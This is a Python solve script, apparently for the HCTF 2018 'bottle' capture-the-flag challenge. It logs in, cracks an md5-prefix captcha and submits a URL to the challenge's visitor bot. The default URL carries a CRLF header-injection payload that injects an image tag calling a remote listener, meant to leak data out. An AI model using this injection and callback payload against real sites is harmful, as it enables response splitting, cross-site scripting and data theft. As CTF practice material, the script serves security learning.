import requests
import re
import sys
from runmd5 import run

req = requests.Session()

URL = 'http://bottle.2018.hctf.io/'


def login():
    data = {
        "username": "vvv",
        "password": "1234567890"
    }
    res = req.post(URL+'login', data=data)
    if res.status_code == 200 and b'Hello vvv' in res.content:
        return True
    return False


def getCaptcha():
    res = req.get(URL+'user')
    if res.status_code == 200 and b'captcha' in res.content:
        html = res.content.decode('utf-8')
        m = re.findall(r'substr\(md5\(captcha\),0,4\) == (.{4})', html)
        if m and len(m) > 0:
            return m[0]
    return False


def fuck(url, code):
    data = {
        "captcha": code,
        "url": url
    }
    res = req.post(URL+'user', data=data)
    if res.status_code == 200 and b'Success' in res.content:
        return True
    return False


if __name__ == '__main__':
        # <img src=//夯.pw/x />
    # url = "//ippppppppp/x"
    url = "http://ippppppppp:7744/d"
    url = "http://bottle.2018.hctf.io/%0a%0d%0a%0d<img src=//1990445111:7744/dec>"
    if len(sys.argv) > 1:
        url = sys.argv[1]
    if login():
        print("[+] Login Success")
        res = getCaptcha()
        if res:
            print("[+] Get Captcha Code %s" % res)
            res = run(res)
            if res:
                print("[+] Decode Captcha %s" % res)
                if fuck(url, res):
                    print("[+] Submit -> %s <- Success" % url)
            else:
                print("[-] Get Captcha Error")
        else:
            print("[-] Get Captcha Error")
    else:
        print("[-] Login Error")
